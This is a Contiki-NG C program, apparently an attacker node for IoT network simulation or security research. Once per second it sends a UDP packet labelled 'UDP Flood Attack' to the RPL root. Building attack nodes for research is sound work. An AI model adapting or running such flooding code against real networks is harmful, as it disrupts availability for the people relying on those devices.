#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/nullnet/nullnet.h"
#include "net/ipv6/simple-udp.h"
#include "sys/log.h"

#define LOG_MODULE "Attacker1"
#define LOG_LEVEL LOG_LEVEL_INFO
#define WITH_SERVER_REPLY 0
#define UDP_ATTACKER_PORT 8765
#define UDP_SERVER_PORT 5
#define SEND_INTERVAL (1 * CLOCK_SECOND)
static struct simple_udp_connection udp_connection;
//------------------------------------------------------------------------------
PROCESS(udp_attacker1_process, "UDP Attacker1");
AUTOSTART_PROCESSES(&udp_attacker1_process);
//------------------------------------------------------------------------------
static void
udp_rx_callback(struct simple_udp_connection *c,
		const uip_ipaddr_t *sender_addr,
		uint16_t sender_port,
		const uip_ipaddr_t *receiver_addr,
		uint16_t receiver_port,
		const uint8_t *data,
		uint16_t datalen)
{
	LOG_INFO("Received response '%.*s' from ", datalen, (char *) data);
	LOG_INFO_6ADDR(sender_addr);
	LOG_INFO_("\n");
}
//------------------------------------------------------------------------------
PROCESS_THREAD(udp_attacker1_process, ev, data)
{
	static struct etimer periodic_timer;
	static char str[32];
	uip_ipaddr_t dest_ipaddr;
	PROCESS_BEGIN();
	
	simple_udp_register(&udp_connection, UDP_ATTACKER_PORT, NULL,
		UDP_SERVER_PORT, udp_rx_callback);
	etimer_set(&periodic_timer, SEND_INTERVAL);

	while(1) {
		PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
		
		if(NETSTACK_ROUTING.node_is_reachable() &&
			NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr))
		{
			LOG_INFO("UDP Flood Attack");
			snprintf(str, sizeof(str), "UDP Flood Attack");
			simple_udp_sendto(&udp_connection, str, strlen(str), &dest_ipaddr);
		} else {
			LOG_INFO("Not reachable yet\n");
		}
		etimer_reset(&periodic_timer);
		}
		
		PROCESS_END();
}